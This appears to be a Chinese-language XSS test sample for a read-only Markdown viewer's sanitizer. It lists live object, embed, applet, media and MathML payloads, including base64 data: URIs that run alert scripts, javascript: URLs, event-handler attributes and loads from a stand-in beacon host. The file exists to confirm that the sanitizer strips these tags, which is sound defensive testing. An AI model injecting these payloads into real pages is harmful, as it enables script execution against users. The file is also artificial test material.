# XSS 样本 10：object / embed / applet 等插件容器

**攻击手法**：`<object>`、`<embed>`、`<applet>` 是"另一套"内容嵌入通道。它们能加载 HTML、SVG、PDF 甚至历史插件格式，且很多消毒器的黑名单里只写了 `script`/`iframe`，忘了这几个。`<object>` 还能通过 `data` 属性加载 `data:text/html`，等价于一个 iframe。

**预期：脚本不执行、无外网请求。**

**验证方法**：打开本文件 → 无弹窗 → 阅读区不出现任何嵌入对象（PDF 预览器、插件占位框等）→ Network 零请求 → Elements 面板中这些标签已被剥离。

---

## payload 1：object 加载外部 HTML

<object data="https://xss-beacon.example.invalid/10-a.html" width="400" height="120"></object>

## payload 2：object 加载 data:text/html（等价 iframe）

<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" width="400" height="80"></object>

## payload 3：object 加载 SVG（SVG 内可执行脚本）

<object data="https://xss-beacon.example.invalid/10-c.svg" type="image/svg+xml" width="200" height="200"></object>

<object data="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoMSkiPjwvc3ZnPg==" type="image/svg+xml"></object>

## payload 4：object + param（老式插件参数）

<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="300" height="100">
  <param name="movie" value="https://xss-beacon.example.invalid/10-e.swf">
  <param name="allowScriptAccess" value="always">
</object>

## payload 5：embed 加载外部资源

<embed src="https://xss-beacon.example.invalid/10-f.svg" type="image/svg+xml" width="200" height="200">

<embed src="https://xss-beacon.example.invalid/10-g.pdf" type="application/pdf" width="400" height="300">

<embed src="javascript:alert('XSS-10-H')">

## payload 6：applet（历史标签，仍应过滤）

<applet code="Evil.class" archive="https://xss-beacon.example.invalid/10-i.jar" width="200" height="100"></applet>

## payload 7：object/embed 上的事件属性

<object data="x" onerror="alert('XSS-10-J')" onload="alert('XSS-10-K')"></object>

<embed src="x" onerror="alert('XSS-10-L')">

## payload 8：媒体元素与 track/source（同属"能发请求的容器"）

<video controls width="300" poster="https://xss-beacon.example.invalid/10-m-poster.jpg">
  <source src="https://xss-beacon.example.invalid/10-n.mp4" type="video/mp4">
  <track src="https://xss-beacon.example.invalid/10-o.vtt" kind="subtitles">
</video>

<audio controls src="https://xss-beacon.example.invalid/10-p.mp3"></audio>

## payload 9：math 与其他外来命名空间容器

<math><maction actiontype="statusline#https://xss-beacon.example.invalid/10-q">点我</maction></math>

<math href="javascript:alert('XSS-10-R')"><mtext>点我</mtext></math>

---

> **判定口径**：以上标签全部剥离，Network 零请求。
> **产品口径提醒**：本应用是**只读 Markdown 查看器**，不承诺渲染视频/音频/PDF 嵌入。因此这些标签一律按"不支持 + 剥离"处理，不做白名单放行——放行任何一个都会引入外网请求面。
